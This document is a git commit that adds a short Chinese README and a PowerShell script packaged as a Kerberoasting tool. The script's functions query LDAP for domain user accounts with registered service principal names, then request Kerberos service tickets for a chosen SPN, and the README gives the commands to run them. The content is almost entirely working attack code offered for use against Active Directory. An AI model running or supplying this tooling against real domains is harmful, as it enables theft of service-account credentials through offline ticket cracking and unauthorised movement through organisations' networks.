1c8b106e7a920a6b833cb6c5f6e45cf1c7012d78
CobaltZirs0n <74412075+CobaltZirs0n@users.noreply.github.com>
2021-04-21 21:24:24 +0800

    Add files via upload

---
+++ README.md
@@ -0,0 +1,16 @@
+# Kerberos.ps1
+
+该脚本是简单封装的Kerberostring利用脚本，即获取SPN服务账户和获取请求票据的操作
+
+```
+Import-Module .\kerberos.ps1
+```
+
+```
+# 获取SPN服务账户
+Frail-Spns
+# 请求服务票据TGS
+Inject-Ticket kadmin/changepw
+```
+
+![image-20210421212008760](kerberos\images\image-20210421212008760.png)
---
+++ kerberos/kerberos.ps1
@@ -0,0 +1,36 @@
+﻿function Frail-Spns{
+	# Build LDAP Filter to look for users with SPN values registered for current domain
+	# 构建LDAP筛选器以查找具有为当前域注册的SPN值的用户
+	$ldapFilter = "(&(objectClass=user)(objectCategory=user)(servicePrincipalName=*))"
+	$domain = New-Object System.DirectoryServices.DirectoryEntry
+	$search = New-Object System.DirectoryServices.DirectorySearcher
+	$search.SearchRoot = $domain
+	$search.PageSize = 1000
+	$search.Filter = $ldapFilter
+	$search.SearchScope = "Subtree"
+
+	# Execute Search
+	#执行搜索操作
+	$results = $search.FindAll()
+
+	# Display SPN values from the returned objects
+	# 遍历SPN的值从对象中并显示
+	$Results = foreach ($result in $results){
+		$result_entry = $result.GetDirectoryEntry()
+		$result_entry | Select-Object @{
+			Name = "Username";  Expression = { $_.sAMAccountName }
+		}, @{
+			Name = "SPN"; Expression = { $_.servicePrincipalName | Select-Object -First 1 }
+		}
+	}
+	echo $Results
+}
+
+function Inject-Ticket{
+	Param(
+		[Parameter(Mandatory=$true)]
+		[String]$ServiceAccount
+	)
+	Add-Type -AssemblyName System.IdentityModel
+	New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "$ServiceAccount"
+}
